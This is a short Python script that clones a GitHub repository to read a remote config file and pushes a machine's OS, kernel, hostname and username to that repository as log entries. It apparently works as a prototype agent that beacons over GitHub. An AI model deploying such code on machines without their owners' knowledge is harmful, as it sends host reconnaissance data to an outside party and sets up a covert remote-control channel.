import git
import os
import json
import time
import shutil

class GitHubConnector:
    def __init__(self, repository_url):
        self.repository_url = repository_url

    def check_for_updates(self):
        try:
            local_directory = "temp_directory"
            repo = git.Repo.clone_from(self.repository_url, local_directory)
            response = None
            config_file_path = os.path.join(local_directory, "config.txt")
            if os.path.exists(config_file_path):
                with open(config_file_path, "r") as file:
                    response = file.read()
                    print(response)

            repo.close()
            shutil.rmtree(local_directory)

            if response:
                return True
            else:
                return False
        except (git.exc.GitCommandError, FileNotFoundError):
            print("error")
            return False


    def log_data(self, data):
        try:
            local_directory = "temp_directory"
            repo = git.Repo.clone_from(self.repository_url, local_directory)
            print(data)
            log_file_path = os.path.join(local_directory, "log.txt")
            with open(log_file_path, "a") as file:
                file.write(str(data) + "\n")
            print(log_file_path)
            repo.index.add([log_file_path])
            repo.index.commit("Add new log entry")
            origin = repo.remote(name="origin")
            origin.push()

            repo.close()
            shutil.rmtree(local_directory)

            return True
        except (git.exc.GitCommandError, FileNotFoundError):
            return False


connector = GitHubConnector("https://github.com/ErniedM/agent-framework2")
data = {'operating_system': 'Linux', 'release': '4.18.0-477.10.1.el8_8.x86_64', 'version': '#1 SMP Tue May 16 11:38:37 UTC 2023', 'architecture': 'x86_64', 'processor': 'x86_64', 'hostname': 'rockylinux', 'username': 'rockylinux', 'python_version': '3.9.16'}
print(connector.log_data(data))